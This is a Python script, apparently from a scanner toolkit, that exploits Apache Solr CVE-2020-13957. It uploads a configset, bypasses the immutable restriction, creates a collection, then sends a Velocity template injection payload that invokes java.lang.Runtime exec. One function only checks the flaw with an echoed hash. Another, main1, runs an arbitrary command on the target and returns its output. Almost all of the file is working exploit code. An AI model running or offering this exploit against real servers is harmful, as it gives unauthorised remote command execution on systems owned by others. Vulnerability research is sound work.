import requests
import string
import random
import hashlib


HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "en-US,en;q=0.5",
    "connection": "close",
    "user-agent": "mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",
}



random_number = ''.join(random.sample(string.ascii_letters + string.digits, 4))
random_number1 = ''.join(random.sample(string.ascii_letters + string.digits, 4))
random_number3 = ''.join(random.sample(string.ascii_letters + string.digits, 4))


def main(ip):
    url = ip + f"/solr/admin/configs?action=UPLOAD&name={random_number}"
    try:
        with open('7.zip', 'rb') as f:
            read_file = f.read()
    except:
        return "目录里不存在7.zip文件"
    requests.post(url, data=read_file, headers=HEADERS, verify=False, timeout=25)
    r = requests.get(url, headers=HEADERS, verify=False, timeout=25)
    if r.status_code == 400:
        return Bypass_restrictions(ip)
    else:
        return "不存在漏洞CVE-2020-13957"


def main1(ip,cmd):
    url = ip + f"/solr/{situation}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    r = requests.get(url, headers=HEADERS, verify=False, timeout=25)
    return r.text


def Bypass_restrictions(ip):
    url = ip + f"/solr/admin/configs?action=CREATE&name={random_number1}&baseConfigSet={random_number}&configSetProp.immutable=false&wt=xml&omitHeader=true"
    requests.get(url, headers=HEADERS, verify=False, timeout=25)
    r = requests.get(url, headers=HEADERS, verify=False, timeout=25)
    if r.status_code == 400:
        return new_core(ip)
    else:
        return "不存在漏洞CVE-2020-13957"



def new_core(ip):
    url = ip + f"/solr/admin/collections?action=CREATE&numShards=1&name={random_number3}&collection.configName={random_number1}"
    requests.get(url, headers=HEADERS, verify=False, timeout=25)
    r = requests.get(url, headers=HEADERS, verify=False, timeout=25)
    if r.status_code == 400:
        return poc(ip)
    else:
        return "不存在漏洞CVE-2020-13957"



def poc(ip):
    s = str(random.randint(800000000, 900000000))
    m = hashlib.md5(s.encode())
    res = m.hexdigest()
    cmd = 'echo '+ res
    url = ip + f"/solr/{random_number3}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    global situation
    situation = random_number3
    r = requests.get(url, headers=HEADERS, verify=False, timeout=25)
    if res in r.text:
        return "存在漏洞CVE-2020-13957,请及时修复!"
    else:
        return "不存在漏洞CVE-2020-13957"


# if __name__ == '__main__':
#     main("http://192.168.41.104:8983")